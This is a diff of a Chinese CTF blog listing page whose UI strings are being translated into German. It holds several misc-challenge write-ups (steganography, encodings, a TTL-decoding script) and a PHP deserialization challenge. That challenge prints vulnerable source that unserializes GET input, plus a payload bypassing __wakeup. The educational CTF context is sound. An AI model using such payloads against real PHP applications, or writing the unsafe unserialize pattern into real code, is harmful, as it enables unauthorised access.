-            <p><script type="text/javascript" src="/js/src/bai.js"></script><br><strong>下载压缩包解压有密码，binwalk分离出来两个压缩包。</strong><br><img src="/2-7-GXYCTF2019-%E4%BD%9B%E7%B3%BB%E9%9D%92%E5%B9%B4/1.png" class title="This is an test image"><br><strong>会直接把fo.txt分离出来。</strong><br><img src="/2-7-GXYCTF2019-%E4%BD%9B%E7%B3%BB%E9%9D%92%E5%B9%B4/2.png" class title="This is an test image"><br><strong>打开是’与佛论禅’密码，在线网站解密一下。</strong><br><img src="/2-7-GXYCTF2019-%E4%BD%9B%E7%B3%BB%E9%9D%92%E5%B9%B4/3.png" class title="This is an test image"></p>
+            <script type="text/javascript" src="/js/src/bai.js"></script>
+<p><strong>下载压缩包解压有密码，binwalk分离出来两个压缩包。</strong></p>
+<img src="/2-7-GXYCTF2019-%E4%BD%9B%E7%B3%BB%E9%9D%92%E5%B9%B4/1.png" class title="This is an test image">
+<p><strong>会直接把fo.txt分离出来。</strong></p>
+<img src="/2-7-GXYCTF2019-%E4%BD%9B%E7%B3%BB%E9%9D%92%E5%B9%B4/2.png" class title="This is an test image">
+<p><strong>打开是’与佛论禅’密码，在线网站解密一下。</strong></p>
+<img src="/2-7-GXYCTF2019-%E4%BD%9B%E7%B3%BB%E9%9D%92%E5%B9%B4/3.png" class title="This is an test image">
 
         </div>
         
@@ -458,7 +507,7 @@
                 <span class="level-item has-text-grey">
                     
                     
-                    a few seconds read (About 110 words)
+                    a few seconds lesen (Über 110 Worte)
                 </span>
                 
                 
@@ -471,7 +520,7 @@
             
         </h1>
         <div class="content">
-            <p><strong>根据题目提示：</strong><br><img src data-echo="2-6-buuctf-misc-从娃娃抓起/2.png" alt="2-6-buuctf-misc-从娃娃抓起"><br>编码是两个汉字编码，试了好多编码形式，找到了两个：中文电码和五笔编码。<br><img src data-echo="2-6-buuctf-misc-从娃娃抓起/3.png" alt="2-6-buuctf-misc-从娃娃抓起"><br><a href="https://dianma.51240.com/">中文电码在线解码</a><br><strong>五笔编码现在还没有找到好的网站去解，只能一个一个对照emmmmmm</strong></p>
+            <p><strong>根据题目提示：</strong><br><img src="/2.png" alt="2-6-buuctf-misc-从娃娃抓起"><br>编码是两个汉字编码，试了好多编码形式，找到了两个：中文电码和五笔编码。<br><img src="/3.png" alt="2-6-buuctf-misc-从娃娃抓起"><br><a href="https://dianma.51240.com/">中文电码在线解码</a><br><strong>五笔编码现在还没有找到好的网站去解，只能一个一个对照emmmmmm</strong></p>
 
         </div>
         
@@ -506,7 +555,7 @@
                 <span class="level-item has-text-grey">
                     
                     
-                    a minute read (About 181 words)
+                    a minute lesen (Über 181 Worte)
                 </span>
                 
                 
@@ -521,7 +570,11 @@
         <div class="content">
             <p><strong>题目是一个txt文件，里面只有4个数字：63，127，191，255。虽然题目提示network，但是看了wp知道是ttl隐写。</strong></p>
 <hr>
-<p><strong>将每个数字转化成8位二进制</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">63 00111111 </span><br><span class="line">127 01111111 </span><br><span class="line">191 10111111 </span><br><span class="line">255 11111111</span><br></pre></td></tr></table></figure><br>每一个 TTL 只有前两位隐藏数据，每四个为一组，隐藏一个字节。<br>附上脚本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import binascii</span><br><span class="line">with open(&#39;attachment.txt&#39;,&#39;r&#39;) as fp:</span><br><span class="line">    a&#x3D;fp.readlines()</span><br><span class="line">    p&#x3D;[]</span><br><span class="line">    for x in range(len(a)):</span><br><span class="line">       p.append(int(a[x])) </span><br><span class="line">    s&#x3D;&#39;&#39;</span><br><span class="line">    for i in p:</span><br><span class="line">        if(i&#x3D;&#x3D;63):</span><br><span class="line">            b&#x3D;&#39;00&#39;</span><br><span class="line">        elif(i&#x3D;&#x3D;127):</span><br><span class="line">            b&#x3D;&#39;01&#39;</span><br><span class="line">        elif(i&#x3D;&#x3D;191):</span><br><span class="line">            b&#x3D;&#39;10&#39;</span><br><span class="line">        else:</span><br><span class="line">            b&#x3D;&#39;11&#39;</span><br><span class="line">        s +&#x3D;b</span><br><span class="line"># print(s)</span><br><span class="line">flag &#x3D; &#39;&#39;</span><br><span class="line">for i in range(0,len(s),8):</span><br><span class="line">    flag +&#x3D; chr(int(s[i:i+8],2))</span><br><span class="line">flag &#x3D; binascii.unhexlify(flag)</span><br><span class="line">wp &#x3D; open(&#39;ans.zip&#39;,&#39;wb&#39;)</span><br><span class="line">wp.write(flag)</span><br><span class="line">wp.close()</span><br></pre></td></tr></table></figure><br><strong>转换成一个压缩包，有密码是伪加密，修改完得到flag。</strong></p>
+<p><strong>将每个数字转化成8位二进制</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">63 00111111 </span><br><span class="line">127 01111111 </span><br><span class="line">191 10111111 </span><br><span class="line">255 11111111</span><br></pre></td></tr></table></figure>
+<p>每一个 TTL 只有前两位隐藏数据，每四个为一组，隐藏一个字节。<br>附上脚本：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import binascii</span><br><span class="line">with open(&#39;attachment.txt&#39;,&#39;r&#39;) as fp:</span><br><span class="line">    a&#x3D;fp.readlines()</span><br><span class="line">    p&#x3D;[]</span><br><span class="line">    for x in range(len(a)):</span><br><span class="line">       p.append(int(a[x])) </span><br><span class="line">    s&#x3D;&#39;&#39;</span><br><span class="line">    for i in p:</span><br><span class="line">        if(i&#x3D;&#x3D;63):</span><br><span class="line">            b&#x3D;&#39;00&#39;</span><br><span class="line">        elif(i&#x3D;&#x3D;127):</span><br><span class="line">            b&#x3D;&#39;01&#39;</span><br><span class="line">        elif(i&#x3D;&#x3D;191):</span><br><span class="line">            b&#x3D;&#39;10&#39;</span><br><span class="line">        else:</span><br><span class="line">            b&#x3D;&#39;11&#39;</span><br><span class="line">        s +&#x3D;b</span><br><span class="line"># print(s)</span><br><span class="line">flag &#x3D; &#39;&#39;</span><br><span class="line">for i in range(0,len(s),8):</span><br><span class="line">    flag +&#x3D; chr(int(s[i:i+8],2))</span><br><span class="line">flag &#x3D; binascii.unhexlify(flag)</span><br><span class="line">wp &#x3D; open(&#39;ans.zip&#39;,&#39;wb&#39;)</span><br><span class="line">wp.write(flag)</span><br><span class="line">wp.close()</span><br></pre></td></tr></table></figure>
+<p><strong>转换成一个压缩包，有密码是伪加密，修改完得到flag。</strong></p>
 
         </div>
         
@@ -556,7 +609,7 @@
                 <span class="level-item has-text-grey">
                     
                     
-                    2 minutes read (About 368 words)
+                    2 minutes lesen (Über 368 Worte)
                 </span>
                 
                 
@@ -569,7 +622,26 @@
             
         </h1>
         <div class="content">
-            <p><strong>根据题目提示：题目有源码备份，下载得到<a href="http://www.zip。">www.zip。</a></strong><br><img src="/2-6-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP/3.png" class title="This is an test image"><br><strong>有三个php文件</strong><br>class.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">class Name&#123;</span><br><span class="line">    private $username &#x3D; &#39;nonono&#39;;</span><br><span class="line">    private $password &#x3D; &#39;yesyes&#39;;</span><br><span class="line"></span><br><span class="line">    public function __construct($username,$password)&#123;</span><br><span class="line">        $this-&gt;username &#x3D; $username;</span><br><span class="line">        $this-&gt;password &#x3D; $password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        $this-&gt;username &#x3D; &#39;guest&#39;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        if ($this-&gt;password !&#x3D; 100) &#123;</span><br><span class="line">            echo &quot;&lt;&#x2F;br&gt;NO!!!hacker!!!&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">            echo &quot;You name is: &quot;;</span><br><span class="line">            echo $this-&gt;username;echo &quot;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">            echo &quot;You password is: &quot;;</span><br><span class="line">            echo $this-&gt;password;echo &quot;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">            die();</span><br><span class="line">        &#125;</span><br><span class="line">        if ($this-&gt;username &#x3D;&#x3D;&#x3D; &#39;admin&#39;) &#123;</span><br><span class="line">            global $flag;</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &quot;&lt;&#x2F;br&gt;hello my friend~~&lt;&#x2F;br&gt;sorry i can&#39;t give you the flag!&quot;;</span><br><span class="line">            die();</span><br><span class="line"></span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><br>index.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    include &#39;class.php&#39;;</span><br><span class="line">    $select &#x3D; $_GET[&#39;select&#39;];</span><br><span class="line">    $res&#x3D;unserialize(@$select);</span><br><span class="line">    ?&gt;</span><br></pre></td></tr></table></figure><br>flag.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag &#x3D; &#39;Syc&#123;dog_dog_dog_dog&#125;&#39;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><br>通过分析知：$select进行反序列化。<br>关键在class.php中的_destruct()魔法函数。<br>对于序列化问题有调用魔法函数顺序的问题：<br><img src="/2-6-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP/4.png" class title="This is an test image"><br><img src="/2-6-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP/5.png" class title="This is an test image"><br>对于题目需要将username=admin，password=100，但是会先执行_wakeup函数将username=guest，所以这道题目关键在于如何绕过_wakeup函数。<br><strong>知识点：如何绕过_wakeup</strong><br><img src="/2-6-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP/6.png" class title="This is an test image"><br>测试php：<br><img src="/2-6-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP/1.png" class title="This is an test image"><br>形成payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">?select&#x3D;O:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;&#125;</span><br></pre></td></tr></table></figure><br>这个payload绕过__wakeup()函数，使username不被覆盖，加上%00是因为username和password都是私有变量，变量中的类名前后会有空白符，而复制的时候会丢失。<br>得到flag<br><img src="/2-6-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP/2.png" class title="This is an test image"></p>
+            <p><strong>根据题目提示：题目有源码备份，下载得到<a href="http://www.zip。">www.zip。</a></strong></p>
+<img src="/2-6-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP/3.png" class title="This is an test image">
+<p><strong>有三个php文件</strong><br>class.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">class Name&#123;</span><br><span class="line">    private $username &#x3D; &#39;nonono&#39;;</span><br><span class="line">    private $password &#x3D; &#39;yesyes&#39;;</span><br><span class="line"></span><br><span class="line">    public function __construct($username,$password)&#123;</span><br><span class="line">        $this-&gt;username &#x3D; $username;</span><br><span class="line">        $this-&gt;password &#x3D; $password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        $this-&gt;username &#x3D; &#39;guest&#39;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        if ($this-&gt;password !&#x3D; 100) &#123;</span><br><span class="line">            echo &quot;&lt;&#x2F;br&gt;NO!!!hacker!!!&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">            echo &quot;You name is: &quot;;</span><br><span class="line">            echo $this-&gt;username;echo &quot;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">            echo &quot;You password is: &quot;;</span><br><span class="line">            echo $this-&gt;password;echo &quot;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">            die();</span><br><span class="line">        &#125;</span><br><span class="line">        if ($this-&gt;username &#x3D;&#x3D;&#x3D; &#39;admin&#39;) &#123;</span><br><span class="line">            global $flag;</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &quot;&lt;&#x2F;br&gt;hello my friend~~&lt;&#x2F;br&gt;sorry i can&#39;t give you the flag!&quot;;</span><br><span class="line">            die();</span><br><span class="line"></span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>index.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    include &#39;class.php&#39;;</span><br><span class="line">    $select &#x3D; $_GET[&#39;select&#39;];</span><br><span class="line">    $res&#x3D;unserialize(@$select);</span><br><span class="line">    ?&gt;</span><br></pre></td></tr></table></figure>
+<p>flag.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag &#x3D; &#39;Syc&#123;dog_dog_dog_dog&#125;&#39;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>通过分析知：$select进行反序列化。<br>关键在class.php中的_destruct()魔法函数。<br>对于序列化问题有调用魔法函数顺序的问题：</p>
+<img src="/2-6-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP/4.png" class title="This is an test image">
+<img src="/2-6-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP/5.png" class title="This is an test image">
+<p>对于题目需要将username=admin，password=100，但是会先执行_wakeup函数将username=guest，所以这道题目关键在于如何绕过_wakeup函数。<br><strong>知识点：如何绕过_wakeup</strong></p>
+<img src="/2-6-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP/6.png" class title="This is an test image">
+<p>测试php：</p>
+<img src="/2-6-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP/1.png" class title="This is an test image">
+<p>形成payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">?select&#x3D;O:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;&#125;</span><br></pre></td></tr></table></figure>
+<p>这个payload绕过__wakeup()函数，使username不被覆盖，加上%00是因为username和password都是私有变量，变量中的类名前后会有空白符，而复制的时候会丢失。<br>得到flag</p>
+<img src="/2-6-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP/2.png" class title="This is an test image">
+
 <p>参考博客：<br><a href="https://www.jianshu.com/p/bfe00fd583df">https://www.jianshu.com/p/bfe00fd583df</a></p>
 
         </div>
@@ -605,7 +677,7 @@
                 <span class="level-item has-text-grey">
                     
                     
-                    2 minutes read (About 256 words)
+                    2 minutes lesen (Über 256 Worte)
                 </span>
                 
                 
@@ -618,7 +690,9 @@
             
         </h1>
         <div class="content">
-            <p><strong>flag2.php，flag3.php都有密码：flag3.php提示密码是六位数，爆破得到密码。</strong><br><img src data-echo="2-6-SWPU2019-你有没有好好看网课/1.png" alt="2-6-SWPU2019-你有没有好好看网课"><br><strong>查看flag.docx</strong><br><img src data-echo="2-6-SWPU2019-你有没有好好看网课/5.png" alt="2-6-SWPU2019-你有没有好好看网课"><br>看了别的师傅的wp，这个docx提示查看mp4对应帧数:<strong>00:00:05:20；00:00:07:11</strong><br><img src data-echo="2-6-SWPU2019-你有没有好好看网课/2.png" alt="2-6-SWPU2019-你有没有好好看网课"><br><img src data-echo="2-6-SWPU2019-你有没有好好看网课/3.png" alt="2-6-SWPU2019-你有没有好好看网课"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">..... ..&#x2F;... .&#x2F;... .&#x2F;... ..&#x2F;dXBfdXBfdXA&#x3D;</span><br></pre></td></tr></table></figure><br>后面一段是base64编码，前面的一段一开始以为是摩斯编码，但是看了wp知道了是敲击码。<br><img src data-echo="2-6-SWPU2019-你有没有好好看网课/4.png" alt="2-6-SWPU2019-你有没有好好看网课"><br>解的flag2.zip密码：<strong>wllmup_up_up</strong><br><strong>flag2.zip下是一张图片，将这张图片用winhex打开，在最下面得到flag。</strong><br><img src data-echo="2-6-SWPU2019-你有没有好好看网课/6.png" alt="2-6-SWPU2019-你有没有好好看网课"></p>
+            <p><strong>flag2.php，flag3.php都有密码：flag3.php提示密码是六位数，爆破得到密码。</strong><br><img src="/1.png" alt="2-6-SWPU2019-你有没有好好看网课"><br><strong>查看flag.docx</strong><br><img src="/5.png" alt="2-6-SWPU2019-你有没有好好看网课"><br>看了别的师傅的wp，这个docx提示查看mp4对应帧数:<strong>00:00:05:20；00:00:07:11</strong><br><img src="/2.png" alt="2-6-SWPU2019-你有没有好好看网课"><br><img src="/3.png" alt="2-6-SWPU2019-你有没有好好看网课"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">..... ..&#x2F;... .&#x2F;... .&#x2F;... ..&#x2F;dXBfdXBfdXA&#x3D;</span><br></pre></td></tr></table></figure>
+<p>后面一段是base64编码，前面的一段一开始以为是摩斯编码，但是看了wp知道了是敲击码。<br><img src="/4.png" alt="2-6-SWPU2019-你有没有好好看网课"><br>解的flag2.zip密码：<strong>wllmup_up_up</strong><br><strong>flag2.zip下是一张图片，将这张图片用winhex打开，在最下面得到flag。</strong><br><img src="/6.png" alt="2-6-SWPU2019-你有没有好好看网课"></p>
 
         </div>
         
@@ -641,10 +715,10 @@
 <div class="card card-transparent">
     <nav class="pagination is-centered" role="navigation" aria-label="pagination">
         <div class="pagination-previous">
-            <a class="is-flex-grow has-text-black-ter" href="/tags/CTF/page/2/">Previous</a>
+            <a class="is-flex-grow has-text-black-ter" href="/tags/CTF/page/2/">Zurück</a>
         </div>
         <div class="pagination-next">
-            <a class="is-flex-grow has-text-black-ter" href="/tags/CTF/page/4/">Next</a>
+            <a class="is-flex-grow has-text-black-ter" href="/tags/CTF/page/4/">Weiter</a>
         </div>
         <ul class="pagination-list is-hidden-mobile">
             
@@ -721,7 +795,7 @@
     <div class="card-content">
         <div class="menu">
             <h3 class="menu-label">
-                Categories
+                Kategorien
             </h3>
             <ul class="menu-list">
             <li>
@@ -851,7 +925,7 @@
             <div class="level-item has-text-centered is-marginless">
                 <div>
                     <p class="heading">
-                        Categories
+                        Kategorien
                     </p>
                     <a href="/categories">
                         <p class="title has-text-weight-normal">
@@ -876,7 +950,7 @@
         
         <div class="level">
             <a class="level-item button is-link is-rounded" href="https://github.com/Da4er" target="_blank" rel="noopener">
-                Follow</a>
+                Folgen</a>
         </div>
         
         
@@ -905,7 +979,7 @@
             <div class="card widget">
     <div class="card-content">
         <h3 class="menu-label">
-            Recent
+            Letzte Einträge
         </h3>
         
         <article class="media">
@@ -1010,7 +1084,7 @@
     <div class="card-content">
         <div class="menu">
         <h3 class="menu-label">
-            Archives
+            Archive
         </h3>
         <ul class="menu-list">
         
@@ -1178,7 +1252,7 @@
             <div class="level-item has-text-centered is-marginless">
                 <div>
                     <p class="heading">
-                        Categories
+                        Kategorien
                     </p>
                     <a href="/categories">
                         <p class="title has-text-weight-normal">
@@ -1203,7 +1277,7 @@
         
         <div class="level">
             <a class="level-item button is-link is-rounded" href="https://github.com/Da4er" target="_blank" rel="noopener">
-                Follow</a>
+                Folgen</a>
         </div>
         
         
@@ -1232,7 +1306,7 @@
         <div class="card widget">
     <div class="card-content">
         <h3 class="menu-label">
-            Recent
+            Letzte Einträge
         </h3>
         
         <article class="media">
@@ -1337,7 +1411,7 @@
     <div class="card-content">
         <div class="menu">
         <h3 class="menu-label">
-            Archives
+            Archive
         </h3>
         <ul class="menu-list">
         
@@ -1586,7 +1660,7 @@ document.addEventListener('DOMContentLoaded', function () {
 </script>
 
 
-<a id="back-to-top" title="Back to Top" href="javascript:;">
+<a id="back-to-top" title="Zurück nach oben" href="javascript:;">
     <i class="fas fa-chevron-up"></i>
 </a>
 <script src="/js/back-to-top.js" defer></script>
@@ -1610,7 +1684,7 @@ document.addEventListener('DOMContentLoaded', function () {
     <div class="searchbox ins-search">
     <div class="searchbox-container ins-search-container">
         <div class="searchbox-input-wrapper">
-            <input type="text" class="searchbox-input ins-search-input" placeholder="Type something..." />
+            <input type="text" class="searchbox-input ins-search-input" placeholder="Tippen Sie etwas..." />
             <span class="searchbox-close ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
         </div>
         <div class="searchbox-result-wrapper ins-section-wrapper">
@@ -1623,10 +1697,10 @@ document.addEventListener('DOMContentLoaded', function () {
         var INSIGHT_CONFIG = {
             TRANSLATION: {
                 POSTS: 'Posts',
-                PAGES: 'Pages',
-                CATEGORIES: 'Categories',
+                PAGES: 'Seiten',
+                CATEGORIES: 'Kategorien',
                 TAGS: 'Tags',
-                UNTITLED: '(Untitled)',
+                UNTITLED: '(Unbenannt)',
             },
             CONTENT_URL: '/content.json',
         };
